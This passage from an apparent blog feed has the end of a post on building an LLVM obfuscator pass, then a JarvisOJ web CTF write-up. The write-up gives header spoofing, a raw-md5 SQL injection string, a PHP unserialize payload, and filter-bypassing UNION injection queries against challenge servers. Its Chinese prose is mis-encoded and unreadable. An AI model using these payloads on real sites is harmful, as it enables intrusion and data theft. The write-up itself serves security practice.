class="variable">$&#123;LLVM_DEFINITIONS&#125;</span>)</span><br><span class="line"><span class="keyword">add_definitions</span>(<span class="variable">$&#123;LLVM_DEFINITIONS_LIST&#125;</span>)</span><br><span class="line"><span class="keyword">include_directories</span>(<span class="variable">$&#123;LLVM_INCLUDE_DIRS&#125;</span>)</span><br><span class="line"></span><br><span class="line">add_llvm_library( LLVMObfuscator MODULE</span><br><span class="line">  src/HelloWorld.cpp</span><br><span class="line">)<span class="comment"># å‘ LLVM æ³¨å†Œ LLVMObfuscator æ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—å¯¹åº”ä¸€ä¸ª so æ–‡ä»¶ï¼ŒåŒ…å« src/HelloWorld.cpp æºä»£ç </span></span><br></pre></td></tr></table></figure><p>test.shï¼šç¼–è¯‘ LLVM Pass å¹¶å¯¹ Test æ–‡ä»¶å¤¹ä¸­çš„ä»£ç è¿›è¡Œæµ‹è¯•ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd ./Build</span><br><span class="line">cmake ../Transforms</span><br><span class="line">make</span><br><span class="line">cd ../Test</span><br><span class="line">clang TestProgram.cpp -emit-llvm -fno-discard-value-names -S -c -o TestProgram.ll</span><br><span class="line">opt -load ../Build/LLVMObfuscator.so -hlw -S TestProgram.ll -o TestProgramhlw.ll</span><br><span class="line">clang TestProgramhlw.ll -o TestProgramhlw</span><br><span class="line">./TestProgramhlw</span><br></pre></td></tr></table></figure><blockquote><p>åŠ ä¸Š<code>-fno-discard-value-names</code>é€‰é¡¹æ˜¯ä¸ºäº†åœ¨ç”Ÿæˆæ–‡æœ¬ IR æ—¶éƒ¨åˆ†å˜é‡çš„åˆ†é…ä¿ç•™æºä»£ç ä¸­çš„å‘½åæ–¹å¼ï¼Œä½¿å¾—å…¶æ›´æ˜“äºé˜…è¯»ã€‚</p><p>å¦‚æœä¸åŠ çš„è¯ï¼Œå˜é‡åå°±å…¨æ˜¯æ•°å­—ï¼Œéš¾ä»¥é˜…è¯»</p></blockquote><p>ä¸åŠ å‚æ•°ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230219210210151.png" alt="image-20230219210210151"></p><p>åŠ ä¸Šå‚æ•°åï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230219210256108.png" alt="image-20230219210256108"></p>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ-Web-wp</title>
      <link href="/posts/7832/"/>
      <url>/posts/7832/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢<br>è¿™å‡ å¤© BUU å¹³å°æœºæˆ¿å‡ºæ•…éšœäº†ï¼Œå›æ¥æŠŠ JarvisOJ å¹³å°å·²ç»åšè¿‡çš„å’Œå‰©ä¸‹çš„ web å…¨éƒ¨å†™ä¸€é wp å§ï¼Œå¾ˆæ€€å¿µå¤§ä¸€é‚£æ—¶å€™è·Ÿé¹ç¥æ™šä¸Šé€šå®µå¹²é¢˜çš„æ—¶å…‰ï¼Œä¸€è½¬çœ¼éƒ½è¿‡äº†ä¸€å¹´äº†</p></blockquote><h1 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h1><p>éœ€è¦ç”¨å…¬ç½‘çš„ä¸€å°æœåŠ¡å™¨è®¿é—®å…¶ 51 ç«¯å£</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218113148.png"></p><p><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></p><h1 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h1><p>æ·»åŠ  xff å¤´<code>x-forwarded-for: 127.0.0.1</code></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218113727.png"></p><h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>ä¸€ä¸ªç™»å½•æ¡†ï¼Œéšä¾¿å¡«æŠ“åŒ…å‘ç°æœ‰ <code>hint</code>ï¼Œæ˜¯ä¸€ä¸ªç»å…¸çš„ md5 å‹ sql æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: &quot;select * from `admin` where password=&#x27;&quot;.md5($pass,true).&quot;&#x27;&quot;</span><br></pre></td></tr></table></figure><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218114047.png"></p><p>payloadï¼š<code>ffifdyop</code></p><p><code>md5()</code>å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯è§„å®šè¾“å‡ºæ ¼å¼ã€‚<code>true</code>ï¼šè¾“å‡ºåŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼å—ï¼Œ<code>false</code>ï¼šè¾“å‡º32å­—ç¬¦åå…­è¿›åˆ¶æ•°</p><p>åŸç†ï¼šæƒ³è¦ç»•è¿‡ï¼Œéœ€å°†æ­¤è¯­å¥å¡«å……ä¸ºï¼š<code>select * form admin where password=&#39;&#39;or 1</code></p><p>ä»¥å‰å¸ˆå‚…ä»¬çš„æ€»ç»“ï¼Œå­—ç¬¦ä¸²ï¼š<code>ffifdyop</code>ç»è¿‡<code>md5</code>åŠ å¯†åï¼š<code>276f722736c95d99e921722cf9ed621c</code></p><p>å†è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼š<code>&#39;or&#39;6&lt;ä¹±ç &gt;</code></p><p> æ‰€ä»¥æ‹¼æ¥åçš„è¯­å¥ä¸ºï¼š<code>select * from admin where password=&#39;&#39;or&#39;6&lt;ä¹±ç &gt;&#39;</code> ï¼Œå°±ç›¸å½“äº<code>select * from admin where password=&#39;&#39;or 1</code>ï¼Œå®ç°æ³¨å…¥ã€‚</p><h1 id="ç¥ç›¾å±€çš„ç§˜å¯†"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h1><p>æºç ä¸­æœ‰æç¤ºï¼Œbase64 è§£ç åä¸º<code>shield.jpg</code>ï¼Œç»å…¸æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218114838.png"></p><p>è¯»<code>showimg.php</code>ï¼Œæ‹¿åˆ°æºç </p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218115217.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$f</span>)) &#123;</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$f</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;\\&#x27;</span>)===<span class="literal">FALSE</span></span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>,<span class="string">&#x27;pctf&#x27;</span>)===<span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File not found!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤æ‰äº†<code>pctf</code>ã€<code>..</code>ã€<code>/</code>ã€<code>\\</code>ï¼Œä¹Ÿå°±æ˜¯å¸¸ç”¨çš„ç›®å½•ç©¿è¶Šçš„ payload è¿‡æ»¤æ‰äº†ï¼Œè¯»<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;shield.php&#x27;</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Shield</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="variable">$g</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;class&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$g</span>)) &#123;</span><br><span class="line"><span class="variable">$x</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$g</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>-&gt;<span class="title function_ invoke__">readfile</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒ…å«äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæ–°å»ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥ GET ç»™ä¸€ä¸ªå‚æ•°<code>class</code>ï¼Œç„¶åååºåˆ—åŒ–<code>class</code>ï¼Œè¯»<code>shield.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable language_">$this</span> -&gt; file = <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file) &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;..&#x27;</span>)===<span class="literal">FALSE</span>  </span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;\\&#x27;</span>)==<span class="literal">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æç¤ºäº† flag åœ¨<code>pctf.php</code>ï¼ŒçŸ¥é“äº†<code>Shield</code>ç±»çš„æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯ä¸èƒ½ç”¨<code>img</code>å‚æ•°ç›´æ¥ä¼ <code>pctf.php</code>ï¼Œå› ä¸ºè¿‡æ»¤å¡æ­»äº†ï¼Œåªèƒ½ç”¨ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰§è¡Œå¯¹è±¡çš„<code>readfile()</code>å‡½æ•°ï¼Œåºåˆ—åŒ–å†…å®¹æœ¬åœ°è·‘ä¸€ä¸‹å°±å‡ºæ¥äº†ï¼Œæœ€åçš„ payloadï¼š<code>?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code></p><h1 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h1><p>æºç ä¸­æ³¨é‡Šæç¤ºäº†<code>index.phps</code>ï¼Œè®¿é—®æ‹¿åˆ°æºç ï¼Œè¿™ä¸ªæºç è¿˜è¦è‡ªå·±æ•´ç†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php?id=1&#x27;</span>); </span><br><span class="line"> <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$a</span>,<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hahahahahaha&#x27;</span>; </span><br><span class="line">    <span class="keyword">return</span> ; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$data</span>==<span class="string">&quot;1112 is a nice lab!&quot;</span> <span class="keyword">and</span> <span class="variable">$id</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>)&gt;<span class="number">5</span> <span class="keyword">and</span> <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;111&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;1114&quot;</span>) <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;flag.txt&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;work harder!harder!harder!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>è€ƒå¯Ÿä¸€äº›å¸¸è§çš„ç»•è¿‡</p><p><code>id</code>ï¼š<code>$id==0</code>ï¼Œå¼±æ¯”è¾ƒç”¨ 0e æˆ–è€…è¾“å…¥è‹±æ–‡å­—æ¯æˆ–è€…ç»™æ•°ç»„ï¼Œéƒ½èƒ½ç»•è¿‡</p><p><code>a</code>ï¼šè¿™ä¸ª<code>a</code>å‚æ•°å’Œ<code>file_get_contents()</code>å‡½æ•°çš„ç»•è¿‡å§¿åŠ¿å°±å¾ˆå¤šäº†ï¼Œæœ€å¸¸è§çš„æ˜¯<code>php://input</code>çš„æ–¹å¼æ¥ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨<code>data:,</code>åè®®æ¥ç»•è¿‡ï¼Œæ¯”å¦‚<code>?a=data:,1112 is a nice lab!</code>æˆ–è€…<code>data://text/plain;base64,MTExMiBpcyBhIG5pY2UgbGFiIQ==</code></p><blockquote><p>å‚è€ƒèµ„æ–™</p><p><a href="https://blog.csdn.net/lxgwm2008/article/details/38437875">dataç±»å‹çš„Urlæ ¼å¼ï¼šæŠŠå°æ•°æ®ç›´æ¥åµŒå…¥åˆ°Urlä¸­</a></p></blockquote><p><code>b</code>ï¼š<code>strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</code>å¯ä»¥ç”¨<code>%00</code>æˆªæ–­æ¥ç»•è¿‡ï¼Œ<code>strlen</code>å‡½æ•°å¯¹<code>%00</code>ä¸æˆªæ–­ä½†<code>substr</code>å’Œ<code>eregi</code>æˆªæ–­</p><p>å¾—åˆ°ä¸€ä¸ªç›®å½•</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218124110.png"></p><p>è¿›æ¥åå°±æ˜¯ç®€å•çš„ sql æ³¨å…¥ç¯èŠ‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210218124902.png"></p><p>åŒå†™èƒ½ç»•è¿‡ï¼Œæ³¨é‡Šéœ€è¦ç”¨<code>/*1*/</code>ï¼Œ1 å¯ä»¥æ˜¯ä»»æ„å€¼ï¼Œä¸€å¥—å¸¦èµ°ï¼Œå¥½åƒè®°å¾—ä¹Ÿå¯ä»¥ç”¨ sqlmap ç›´æ¥æ¢­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//çˆ†å­—æ®µæ•°ï¼šå¾—åˆ°3</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,3#</span><br><span class="line">//çˆ†åº“ï¼šå¾—åˆ°test</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(schema_name)/*111*/frfromom/*111*/information_schema.schemata#</span><br><span class="line">//çˆ†è¡¨ï¼šå¾—åˆ°content</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(table_name)/*111*/frfromom/*111*/information_schema.tables/*111*/where/*111*/table_schema=0x74657374</span><br><span class="line">//çˆ†å­—æ®µï¼šå¾—åˆ°id,context,title</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(column_name)/*111*/frfromom/*111*/information_schema.columns/*111*/where/*111*/table_name=0x636f6e74656e74</span><br><span class="line">//çˆ†å†…å®¹ï¼š</span><br><span class="line">id=0/*111*/ununionion/*111*/seselectlect/*111*/1,2,group_concat(context)/*111*/frfromom/*111*/test.content#</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h1><p>ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª so æ–‡ä»¶ï¼Œæ˜¯ mysql UDF å¼€å‘çš„ä¸œè¥¿ï¼Œæˆ‘çš„ç†è§£æ˜¯ç›¸å½“äºå†™äº†ä¸€ä¸ªå‡½æ•°åº“ï¼Œç±»ä¼¼äº dll ï¼Œmysql ç”¨çš„æ—¶å€™å¯¼å…¥</p><blockquote><p>å‚è€ƒèµ„æ–™</p><p><a href="https://blog.csdn.net/albertsh/article/details/78567661">mysqlå‡½æ•°æ‰©å±•ä¹‹UDFå¼€å‘</a></p><p>sql è¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION XXXXX RETURNS INTEGER SONAME &quot;YYYYY.so&quot;;1</span><br></pre></td></tr></table></figure><p>å­˜å‚¨è¿‡ç¨‹çš„åå­—å«åš<code>CreateUDF</code>ï¼Œå½“æ—¶çœ‹åˆ°è¿™æ¡è¯­å¥å¾ˆè¿·æƒ‘ï¼Œæ ¹æœ¬ä¸çŸ¥é“æ˜¯åšä»€ä¹ˆç”¨çš„ï¼Œåªèƒ½åœ¨é¡¹ç›®èµ„æºä¸­æŸ¥æ‰¾<code>YYYYY.so</code>è¿™ä¸ªåº“æ–‡ä»¶ï¼Œç»“æœå´ä»€ä¹ˆä¹Ÿæ²¡æœ‰æ‰¾åˆ°ï¼Œä¸€ç•ªåŠªåŠ›ä¹‹åæˆ‘æ–­å®šï¼Œé¡¹ç›®ä¸­è°ƒç”¨<code>CreateUDF</code>ä¹‹åå¹¶æ²¡æœ‰äº§ç”Ÿä»»ä½•æ•ˆæœã€‚</p><p>å…³äºUDFè¯¦ç»†çš„è§£é‡Šå’Œä½¿ç”¨æ–¹æ³•è¯·å‚ç…§MYSQLå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://dev.mysql.com/doc/refman/5.7/en/adding-udf.html">Adding a New User-Defined Function</a></p><p>è¿™é‡Œåªåšä¸€ä¸ªç®€å•çš„è§£é‡Šï¼š<code>UDF</code> å…¨ç§°æ˜¯ <code>User defined function</code>ï¼Œ å±äº mysql çš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼Œä¸€èˆ¬ç¿»è¯‘ä¸ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œè¿™ä¸ªæ˜¯ç”¨æ¥æ‹“å±• mysql çš„æŠ€æœ¯æ‰‹æ®µã€‚</p><p>æˆ‘ä»¬çŸ¥é“ mysql æœ¬èº«æä¾›äº†å¤§é‡çš„å‡½æ•°ï¼Œå¹¶ä¸”ä¹Ÿæ”¯æŒå®šä¹‰å‡½æ•°ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜éœ€è¦ UDF å‘¢ï¼Ÿè¿™ä¸»è¦çœ‹åˆ°äº†ä»–çš„<strong>ä¼˜ç‚¹ï¼šUDF æœ¬èº«çš„å…¼å®¹æ€§å¾ˆå¥½ï¼Œå¹¶ä¸”æ¯”å­˜å‚¨æ–¹æ³•å…·æœ‰æ›´é«˜çš„æ‰§è¡Œæ•ˆç‡ï¼ŒåŒæ—¶æ”¯æŒèšé›†å‡½æ•°ï¼Œç›¸æ¯”ä¿®æ”¹åŸä»£ç å¢åŠ å‡½æ•°ï¼Œæ›´åŠ æ–¹ä¾¿ç®€å•ï¼Œä½†æ˜¯UDFä¹Ÿå¤„äºmysqldçš„å†…å­˜ç©ºé—´ä¸­ï¼Œä¸è°¨æ…çš„å†…å­˜ä½¿ç”¨å¾ˆå®¹æ˜“å¯¼è‡´mysqlçš„æœåŠ¡æŒ‚æ‰ã€‚</strong></p></blockquote><p>å¤åˆ¶ so æ–‡ä»¶åˆ°<code>/usr/lib64/mysql/plugin</code>ï¼Œæ‰§è¡Œè¯­å¥å¯¼å…¥ï¼Œç„¶åæ‰§è¡Œ getflag() å‡½æ•°å°±å‡ºæ¥äº†</p><h1 id="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"><a href="#flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ" class="headerlink" title="flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ"></a>flagåœ¨ç®¡ç†å‘˜æ‰‹é‡Œ</h1><p>æ‰«ç›®å½•å‘ç°æœ‰<code>index.php~</code>ï¼Œæ˜¯ php çš„å¤‡ä»½æ¢å¤æ–‡ä»¶ï¼Œæ”¹åç¼€åä¸º<code>index.php.swp</code>æ‹– kali é‡Œé¢æ‹¿ vim æ‰“å¼€å°±è¡Œï¼Œ<code>vim -r æ–‡ä»¶</code>æ¢å¤ä¸Šæ¬¡å¼‚å¸¸çš„æ–‡ä»¶ï¼Œæ‹¿åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$role</span> = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line"><span class="variable">$salt</span> = </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>])) &#123;</span><br><span class="line"><span class="variable">$role</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]);</span><br><span class="line"><span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role</span>===<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$hsh</span> === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;role&quot;</span>]))) &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$role</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;role&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$hsh</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="title function_ invoke__">strrev</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;hsh&#x27;</span>,<span class="variable">$hsh</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$auth</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">echo &quot;</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç®€å•è¯»ä¸€ä¸‹ä»£ç é€»è¾‘</p><p>é¦–å…ˆæ˜¯è®¾ä¸¤ä¸ª cookie ä¸€ä¸ªæ˜¯<code>role</code>ï¼Œå€¼æ˜¯<code>$role</code>åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œå¦ä¸€ä¸ªæ˜¯<code>hsh</code>ï¼Œå€¼æ˜¯<code>$salt</code>æ‹¼æ¥ä¸Šå€’åºåçš„<code>$s</code>ï¼ˆ<code>$role</code>åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼‰ç„¶åè¿›è¡Œ<code>md5</code>åŠ å¯†</p><p>ç„¶åå°±æ˜¯æŠŠ cookie ä¸­çš„ <code>role</code>ååºåˆ—åŒ–ç»™ <code>$role</code>ï¼Œ<code>hsh</code>çš„å€¼è·Ÿ<code>md5($salt.strrev($_COOKIE[&quot;role&quot;])</code>è¿›è¡Œå¼ºæ¯”è¾ƒï¼Œå°±æ˜¯æŠŠ cookie ä¸­çš„ <code>role</code>è¿›è¡Œå€’åºä¸<code>$salt</code>æ‹¼æ¥å†è¿›è¡Œ <code>md5</code>åŠ 